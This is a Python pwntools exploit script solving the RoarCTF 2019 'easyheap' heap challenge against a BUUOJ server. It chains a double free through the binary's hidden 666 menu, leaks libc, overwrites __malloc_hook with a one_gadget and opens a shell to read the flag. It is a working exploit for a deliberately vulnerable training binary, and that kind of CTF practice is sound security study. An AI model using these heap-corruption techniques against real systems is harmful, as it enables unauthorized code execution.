# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 

# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './roarctf_2019_easyheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26176'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , content = 'a'):
    cmd(1)
    sla('size' , size)
    sla('content' , content)

def darkadd(size , content = 'a'):
    sleep(0.3)
    sl('1')
    sleep(0.3)
    sl( str(size))
    sleep(0.3)
    sl( content)

def delete(dark = 0):
    if(dark):
        sleep(0.3)
        sl('2')
    else:
        cmd(2)

def show(dark = 0):
    if(dark):
        sleep(0.3)
        sl('3')
    else:
        cmd(3)

def backdoor(content = 'a'):
    sleep(0.3)
    cmd(666)
    sleep(0.3)
    sla('build or free?' , 1)
    sleep(0.3)
    sla('content' , content)

def darkbackdoor(content = 'a'):
    sleep(0.3)
    sl('666')
    sleep(0.3)
    sl('1')
    sleep(0.3)
    sl(content)

def backdoorDelete():
    sleep(0.3)
    cmd(666)
    sleep(0.3)
    sla('build or free?' , 2)

def darkbackdoorDelete():
    sleep(0.3)
    sl('666')
    sleep(0.3)
    sl('2')


def attack():
    
    name_ptr = 0x602058
    sa('name:' , flat(0x60))
    sa('info:' , 'niyah')

    # dbg()
    backdoor()
    add( 0x58 )
    backdoorDelete()
    add( 0x58 )
    # 此时 backdoor 的指针已经指向一个大小为 0x60 的堆块
    add( 0x58 )
    # 正常指针也指向了一个不同的 大小为 0x60 的堆块
    delete()
    backdoorDelete()
    delete()
    
    add( 0x58 , p64(0x602058) )
    add( 0x58 )
    add( 0x58 )
    add( 0x58 , flat( '\x00'*0x20 , 0x602068 ,0xDEADBEEFDEADBEEF,0x602068 ))
    cmd(666)

    # 这里虽然为 flag 标志为 0 了但还是会就减一，这样就出现了负数
    # 但复数的布尔值也是1 
    
    add( 0x80 )
    backdoor()
    delete()
    show()

    __malloc_hook = l64() - 0x68
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    ogg = one_gadget(libc.path)[3] + libc.address

    lg('__malloc_hook' , __malloc_hook)

    ru('price')

    darkadd(0x80)
    darkbackdoor()
    darkbackdoorDelete()
    darkadd(0x68)
    darkadd(0x68)

    delete(1)
    darkbackdoorDelete()
    delete(1)

    darkadd(0x68 , p64(__malloc_hook - 0x23))
    darkadd(0x68)
    darkadd(0x68)
    darkadd(0x68 , flat( '\x00'*(0x13-8) , ogg , realloc + 0x14).ljust( 0x68 ,'\x00'))

    darkadd(0x28)
    # dbg()

attack()
p.success(getShell())
p.interactive()

'''
@File    :   roarctf_2019_easyheap.py
@Time    :   2021/10/24 15:52:24
@Author  :   Niyah 
'''